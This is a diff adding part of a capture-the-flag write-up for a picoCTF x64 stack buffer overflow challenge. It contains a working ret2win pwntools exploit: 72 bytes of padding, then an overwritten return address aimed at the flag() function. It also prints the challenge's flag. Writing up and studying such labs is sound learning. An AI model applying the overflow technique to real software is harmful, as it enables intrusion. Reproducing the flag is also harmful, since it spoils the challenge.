@@ -91,4 +91,96 @@ int main(int argc, char **argv){
 
 ![image](https://user-images.githubusercontent.com/70703371/188854058-6e90c4d1-ba23-47ff-8ad5-c17670eb579a.png)
 
-12. 
+12. Let's see the pattern offset of **rsp** so we know the correct buffer.
+
+![image](https://user-images.githubusercontent.com/70703371/188879246-34429dbe-e046-45a3-bbb3-42f0f78ebe94.png)
+
+13. Hmm 72 for little endian.
+14. Now we just need to find the `flag()` function's address.
+
+![image](https://user-images.githubusercontent.com/70703371/188879464-7b9a2a3d-a657-4a2f-a336-875fb0a02f88.png)
+
+```
+address -> 0x401236
+```
+
+15. So i made a script in python to solve this, notice the concept is similiar to **ret2win**.
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+addrFlag = 0x401236
+
+sh = remote('saturn.picoctf.net', 56872)
+
+p = b'A' * 72 # pattern offset of $rsp
+p += p64(4198966) # flag address to decimal value
+
+sh.recvuntil('\n')
+sh.sendline(p)
+
+sh.interactive()
+```
+
+
+![image](https://user-images.githubusercontent.com/70703371/188879874-e32fe1f7-3aa5-4668-855d-b4daec80c64c.png)
+
+
+16. Got EOF, kinda confused why.
+17. I think for the padding absolutely correct, might be the address not.
+18. So i tried to disassmble the `flag()` function using gdb.
+
+![image](https://user-images.githubusercontent.com/70703371/188880194-cd0cc8a1-a0bf-4582-9922-cf0caebe88ac.png)
+
+19. Let's try this address, since it the data copied to rsp.
+
+> NOTES
+
+```
+mov means in assembly -> The mov instruction copies the data item referred to by its second operand
+```
+
+![image](https://user-images.githubusercontent.com/70703371/188880448-6a21253f-2570-4dc9-94e1-c7783133039e.png)
+
+> FINAL SCRIPT
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+addrFlag = 0x000000000040123b
+
+sh = remote('saturn.picoctf.net', 56872)
+
+p = b'A' * 72 # pattern offset of $rsp
+p += p64(4198971) # flag address to decimal value
+
+sh.recvuntil('\n')
+sh.sendline(p)
+
+sh.interactive()
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/188881487-1dfaf87a-af88-40f9-82ae-8076b2216d74.png)
+
+20. Finally, we got the flag!
+
+## FLAG
+
+```
+picoCTF{b1663r_15_b3773r_964d9987}
+```
+
+## LEARNING REFERENCES:
+
+```
+https://www.felixcloutier.com/x86/mov
+```
+
